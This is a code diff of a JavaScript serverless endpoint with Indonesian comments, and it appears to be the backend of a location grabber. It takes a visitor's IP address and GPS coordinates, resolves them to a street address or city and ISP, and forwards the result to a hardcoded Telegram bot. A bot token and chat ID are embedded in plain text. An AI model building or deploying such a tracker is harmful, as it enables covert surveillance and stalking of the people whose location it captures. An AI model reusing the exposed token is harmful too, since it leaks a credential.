@@ -1,19 +1,12 @@
 export default async function handler(req, res) {
-    // Allow CORS
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
     
-    if (req.method === 'OPTIONS') {
-        return res.status(200).end();
-    }
-    
-    if (req.method !== 'POST') {
-        return res.status(405).json({ error: 'Method not allowed' });
-    }
+    if (req.method === 'OPTIONS') return res.status(200).end();
+    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });
     
     const { ip, lat, lon, accuracy } = req.body;
     
-    // TOKEN YANG BENAR (tanpa huruf Y di depan)
     const botToken = '8784325672:AAGIjFlqRS_MnMzXaqcgn3lhIzcGaq-1E30';
     const chatId = '8564704937';
     
@@ -21,18 +14,15 @@ export default async function handler(req, res) {
     
     if (lat && lon) {
         msg += `📍 GPS: ${lat}, ${lon}\n📏 Akurasi: ${accuracy || '?'} meter\n`;
-        // Reverse geocoding
         try {
-            const geoRes = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`);
-            const geo = await geoRes.json();
+            const geo = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}`).then(r => r.json());
             msg += `🏠 Alamat: ${geo.display_name || '-'}\n`;
         } catch(e) {
-            msg += `🏠 Alamat: Gagal reverse geocoding\n`;
+            msg += `🏠 Alamat: gagal reverse\n`;
         }
     } else if (ip) {
         try {
-            const geoRes = await fetch(`http://ip-api.com/json/${ip}`);
-            const geo = await geoRes.json();
+            const geo = await fetch(`http://ip-api.com/json/${ip}`).then(r => r.json());
             if (geo.status === 'success') {
                 msg += `📍 Lokasi: ${geo.city}, ${geo.regionName}, ${geo.country}\n📡 ISP: ${geo.isp}\n🗺️ Koordinat: ${geo.lat}, ${geo.lon}\n`;
             }
@@ -42,26 +32,21 @@ export default async function handler(req, res) {
     msg += `\n🕐 Waktu: ${new Date().toISOString()}`;
     
     // Kirim ke Telegram
-    try {
-        const tgRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ 
-                chat_id: chatId, 
-                text: msg,
-                disable_web_page_preview: true 
-            })
-        });
-        
-        const tgData = await tgRes.json();
-        console.log('Telegram response:', tgData);
-        
-        if (!tgRes.ok) {
-            console.error('Telegram error:', tgData);
-        }
-    } catch (err) {
-        console.error('Failed to send to Telegram:', err);
-    }
+    const tgResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+    });
     
-    res.json({ status: 'ok', received: { ip, lat, lon, accuracy } });
+    const tgResult = await tgResponse.json();
+    
+    // Log ke Vercel console
+    console.log('Telegram send result:', tgResult);
+    
+    // Return response
+    res.json({ 
+        status: 'ok', 
+        telegram: tgResult,
+        data: { ip, lat, lon, accuracy }
+    });
 }
